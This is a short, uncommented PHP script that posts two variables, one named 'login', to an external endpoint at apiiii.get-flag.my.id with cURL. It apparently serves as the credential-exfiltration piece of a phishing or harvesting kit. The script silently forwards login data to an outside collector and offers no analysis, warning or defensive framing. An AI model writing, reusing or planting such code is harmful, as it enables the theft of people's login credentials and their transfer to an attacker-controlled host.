<?php
$link = "http://apiiii.get-flag.my.id/api.php";
$data = "dalam=".$dalam."&login=".$login;
$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, $link);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($ch2);
curl_close($ch2);
?>
